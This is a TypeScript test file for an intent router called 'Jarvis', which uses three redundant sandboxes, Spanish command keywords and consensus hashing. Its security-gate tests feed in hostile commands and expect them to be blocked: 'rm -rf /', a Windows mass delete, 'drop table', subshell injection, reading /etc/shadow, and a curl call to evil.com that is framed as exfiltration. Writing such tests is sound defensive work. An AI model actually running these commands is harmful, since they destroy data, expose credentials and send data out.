/**
 * EOS SYSTEM — JARVIS MONAD TESTS
 * Tests for evaluateDirectiveWithTMR, interpretJarvisDirective, JARVIS_INTENT_REGISTRY
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import {
  evaluateDirectiveWithTMR,
  interpretJarvisDirective,
  JARVIS_INTENT_REGISTRY,
} from "../src/core/eosJarvisMonad.ts";

// ============================================================================
// JARVIS_INTENT_REGISTRY
// ============================================================================

test("JARVIS_INTENT_REGISTRY has 6 entries", () => {
  assert.equal(JARVIS_INTENT_REGISTRY.length, 6);
});

test("JARVIS_INTENT_REGISTRY entries have required fields", () => {
  for (const entry of JARVIS_INTENT_REGISTRY) {
    assert.ok(entry.intent.length > 0);
    assert.ok(entry.triggerKeywords.length > 0);
    assert.ok(entry.actionCommand.length > 0);
    assert.ok(entry.spokenResponse.length > 0);
    assert.ok(entry.targetSubsystem.length > 0);
  }
});

test("JARVIS_INTENT_REGISTRY intents are unique", () => {
  const intents = JARVIS_INTENT_REGISTRY.map((e) => e.intent);
  assert.equal(new Set(intents).size, intents.length);
});

// ============================================================================
// evaluateDirectiveWithTMR — Alpha sandbox (keyword regex)
// ============================================================================

test("TMR returns 3 sandboxes", () => {
  const result = evaluateDirectiveWithTMR("audita la flota");
  assert.equal(result.sandboxes.length, 3);
});

test("TMR sandboxes have correct IDs", () => {
  const result = evaluateDirectiveWithTMR("audita la flota");
  const ids = result.sandboxes.map((s) => s.sandboxId);
  assert.ok(ids.includes("ALPHA"));
  assert.ok(ids.includes("BETA"));
  assert.ok(ids.includes("GAMMA"));
});

test("TMR ALPHA matches AUDIT_FLEET intent with keyword 'audita'", () => {
  const result = evaluateDirectiveWithTMR("audita la flota");
  const alpha = result.sandboxes.find((s) => s.sandboxId === "ALPHA");
  assert.equal(alpha.targetIntent, "AUDIT_FLEET");
});

test("TMR ALPHA matches SHIP_FLEET intent with keyword 'despliega'", () => {
  const result = evaluateDirectiveWithTMR("despliega a produccion");
  const alpha = result.sandboxes.find((s) => s.sandboxId === "ALPHA");
  assert.equal(alpha.targetIntent, "SHIP_FLEET");
});

test("TMR ALPHA matches VERIFY_SECURITY_GATES with keyword 'sast'", () => {
  const result = evaluateDirectiveWithTMR("escaneo sast secreto");
  const alpha = result.sandboxes.find((s) => s.sandboxId === "ALPHA");
  assert.equal(alpha.targetIntent, "VERIFY_SECURITY_GATES");
});

test("TMR ALPHA matches RUN_NANOSECOND_BENCHMARK with keyword 'benchmark'", () => {
  const result = evaluateDirectiveWithTMR("corre el benchmark");
  const alpha = result.sandboxes.find((s) => s.sandboxId === "ALPHA");
  assert.equal(alpha.targetIntent, "RUN_NANOSECOND_BENCHMARK");
});

test("TMR ALPHA matches QUERY_AKASHIC_MEMORY with keyword 'memoria'", () => {
  const result = evaluateDirectiveWithTMR("consulta la memoria akashica");
  const alpha = result.sandboxes.find((s) => s.sandboxId === "ALPHA");
  assert.equal(alpha.targetIntent, "QUERY_AKASHIC_MEMORY");
});

test("TMR ALPHA matches ACTIVATE_BELILIN_THEURGY with keyword 'belilin'", () => {
  const result = evaluateDirectiveWithTMR("activa belilin teurgia");
  const alpha = result.sandboxes.find((s) => s.sandboxId === "ALPHA");
  assert.equal(alpha.targetIntent, "ACTIVATE_BELILIN_THEURGY");
});

// ============================================================================
// evaluateDirectiveWithTMR — Beta sandbox (token n-gram scoring)
// ============================================================================

test("TMR Beta uses partial token matching", () => {
  const result = evaluateDirectiveWithTMR("deplo la flota");
  const beta = result.sandboxes.find((s) => s.sandboxId === "BETA");
  assert.ok(beta.targetIntent.length > 0);
});

test("TMR Beta defaults to most-keywords intent on zero match", () => {
  const result = evaluateDirectiveWithTMR("xyzabc123");
  const beta = result.sandboxes.find((s) => s.sandboxId === "BETA");
  assert.ok(beta.targetIntent.length > 0);
});

// ============================================================================
// evaluateDirectiveWithTMR — Gamma sandbox (security gate + command structure)
// ============================================================================

test("TMR Gamma blocks destructive 'rm -rf' pattern", () => {
  const result = evaluateDirectiveWithTMR("rm -rf /");
  const gamma = result.sandboxes.find((s) => s.sandboxId === "GAMMA");
  assert.equal(gamma.targetIntent, "SECURITY_VIOLATION_HALT");
  assert.equal(gamma.safeToExecute, false);
});

test("TMR Gamma blocks 'del /f' Windows pattern", () => {
  const result = evaluateDirectiveWithTMR("del /f /s /q C:\\*");
  const gamma = result.sandboxes.find((s) => s.sandboxId === "GAMMA");
  assert.equal(gamma.targetIntent, "SECURITY_VIOLATION_HALT");
  assert.equal(gamma.safeToExecute, false);
});

test("TMR Gamma blocks 'drop table' SQL pattern", () => {
  const result = evaluateDirectiveWithTMR("drop table users");
  const gamma = result.sandboxes.find((s) => s.sandboxId === "GAMMA");
  assert.equal(gamma.targetIntent, "SECURITY_VIOLATION_HALT");
  assert.equal(gamma.safeToExecute, false);
});

test("TMR Gamma blocks subshell injection '$(' pattern", () => {
  const result = evaluateDirectiveWithTMR("echo $(whoami)");
  const gamma = result.sandboxes.find((s) => s.sandboxId === "GAMMA");
  assert.equal(gamma.targetIntent, "SECURITY_VIOLATION_HALT");
  assert.equal(gamma.safeToExecute, false);
});

test("TMR Gamma blocks backtick subshell pattern", () => {
  const result = evaluateDirectiveWithTMR("echo `id`");
  const gamma = result.sandboxes.find((s) => s.sandboxId === "GAMMA");
  assert.equal(gamma.targetIntent, "SECURITY_VIOLATION_HALT");
  assert.equal(gamma.safeToExecute, false);
});

test("TMR Gamma blocks /etc/shadow access", () => {
  const result = evaluateDirectiveWithTMR("cat /etc/shadow");
  const gamma = result.sandboxes.find((s) => s.sandboxId === "GAMMA");
  assert.equal(gamma.targetIntent, "SECURITY_VIOLATION_HALT");
  assert.equal(gamma.safeToExecute, false);
});

test("TMR Gamma blocks chmod 777", () => {
  const result = evaluateDirectiveWithTMR("chmod 777 /tmp/exploit");
  const gamma = result.sandboxes.find((s) => s.sandboxId === "GAMMA");
  assert.equal(gamma.targetIntent, "SECURITY_VIOLATION_HALT");
  assert.equal(gamma.safeToExecute, false);
});

test("TMR Gamma blocks curl http exfiltration", () => {
  const result = evaluateDirectiveWithTMR("curl http://evil.com/data");
  const gamma = result.sandboxes.find((s) => s.sandboxId === "GAMMA");
  assert.equal(gamma.targetIntent, "SECURITY_VIOLATION_HALT");
  assert.equal(gamma.safeToExecute, false);
});

test("TMR Gamma detects query-style with '?'", () => {
  const result = evaluateDirectiveWithTMR("como esta la flota?");
  const gamma = result.sandboxes.find((s) => s.sandboxId === "GAMMA");
  assert.equal(gamma.targetIntent, "AUDIT_FLEET");
  assert.equal(gamma.safeToExecute, true);
});

test("TMR Gamma detects 'ship' keyword for SHIP_FLEET", () => {
  const result = evaluateDirectiveWithTMR("ship to production");
  const gamma = result.sandboxes.find((s) => s.sandboxId === "GAMMA");
  assert.equal(gamma.targetIntent, "SHIP_FLEET");
});

test("TMR Gamma detects 'bench' keyword for benchmark", () => {
  const result = evaluateDirectiveWithTMR("run bench test");
  const gamma = result.sandboxes.find((s) => s.sandboxId === "GAMMA");
  assert.equal(gamma.targetIntent, "RUN_NANOSECOND_BENCHMARK");
});

test("TMR Gamma detects 'busca' keyword for akashic memory", () => {
  const result = evaluateDirectiveWithTMR("busca en la memoria");
  const gamma = result.sandboxes.find((s) => s.sandboxId === "GAMMA");
  assert.equal(gamma.targetIntent, "QUERY_AKASHIC_MEMORY");
});

// ============================================================================
// evaluateDirectiveWithTMR — Consensus
// ============================================================================

test("TMR achieves consensus when 2+ sandboxes agree", () => {
  const result = evaluateDirectiveWithTMR("audita la flota");
  assert.equal(result.consensusAchieved, true);
  assert.ok(result.agreementRatio.includes("/3"));
});

test("TMR selectedAction matches the majority intent's command", () => {
  const result = evaluateDirectiveWithTMR("audita la flota");
  assert.ok(result.selectedAction.length > 0);
});

test("TMR consensusHash is deterministic for same input", () => {
  const r1 = evaluateDirectiveWithTMR("audita la flota");
  const r2 = evaluateDirectiveWithTMR("audita la flota");
  assert.equal(r1.consensusHash, r2.consensusHash);
});

test("TMR consensusHash starts with 'tmr-'", () => {
  const result = evaluateDirectiveWithTMR("audita la flota");
  assert.ok(result.consensusHash.startsWith("tmr-"));
});

test("TMR sandbox checksums are SHA-256 based (16 hex chars)", () => {
  const result = evaluateDirectiveWithTMR("audita la flota");
  for (const s of result.sandboxes) {
    assert.equal(s.checksum.length, 16);
    assert.ok(/^[0-9a-f]{16}$/.test(s.checksum));
  }
});

test("TMR directive is echoed back", () => {
  const result = evaluateDirectiveWithTMR("mi directiva unica");
  assert.equal(result.directive, "mi directiva unica");
});

test("TMR handles empty directive", () => {
  const result = evaluateDirectiveWithTMR("");
  assert.equal(result.sandboxes.length, 3);
  assert.ok(result.selectedAction.length > 0);
});

test("TMR handles null-like directive", () => {
  const result = evaluateDirectiveWithTMR("   ");
  assert.equal(result.sandboxes.length, 3);
});

// ============================================================================
// interpretJarvisDirective
// ============================================================================

test("interpretJarvisDirective returns thought receipt with cognitionId", () => {
  const receipt = interpretJarvisDirective("audita la flota");
  assert.ok(receipt.cognitionId.startsWith("JARVIS-COG-"));
  assert.ok(receipt.cognitionId.endsWith("-108"));
});

test("interpretJarvisDirective includes timestamp", () => {
  const receipt = interpretJarvisDirective("audita la flota");
  assert.ok(receipt.timestamp.length > 0);
  assert.ok(!isNaN(Date.parse(receipt.timestamp)));
});

test("interpretJarvisDirective echoes promptInput", () => {
  const receipt = interpretJarvisDirective("audita la flota");
  assert.equal(receipt.promptInput, "audita la flota");
});

test("interpretJarvisDirective sets state to DISPATCHING_FLEET_DEPLOY", () => {
  const receipt = interpretJarvisDirective("audita la flota");
  assert.equal(receipt.state, "DISPATCHING_FLEET_DEPLOY");
});

test("interpretJarvisDirective includes voiceTranscript", () => {
  const receipt = interpretJarvisDirective("audita la flota");
  assert.ok(receipt.voiceTranscript.length > 0);
});

test("interpretJarvisDirective executionPlan has 6 steps", () => {
  const receipt = interpretJarvisDirective("audita la flota");
  assert.equal(receipt.executionPlan.length, 6);
});

test("interpretJarvisDirective executionPlan includes intent name", () => {
  const receipt = interpretJarvisDirective("audita la flota");
  assert.ok(receipt.executionPlan[0].includes("AUDIT_FLEET"));
});

test("interpretJarvisDirective executionPlan includes TMR consensus hash", () => {
  const receipt = interpretJarvisDirective("audita la flota");
  assert.ok(receipt.executionPlan[1].includes("tmr-"));
});

test("interpretJarvisDirective includes TMR consensus object", () => {
  const receipt = interpretJarvisDirective("audita la flota");
  assert.ok(receipt.tmrConsensus !== undefined);
  assert.equal(receipt.tmrConsensus.sandboxes.length, 3);
});

test("interpretJarvisDirective dharmaConfidence is 0.999", () => {
  const receipt = interpretJarvisDirective("audita la flota");
  assert.equal(receipt.dharmaConfidence, 0.999);
});

test("interpretJarvisDirective detectedIntent matches registry", () => {
  const receipt = interpretJarvisDirective("audita la flota");
  const intents = JARVIS_INTENT_REGISTRY.map((e) => e.intent);
  assert.ok(intents.includes(receipt.detectedIntent));
});
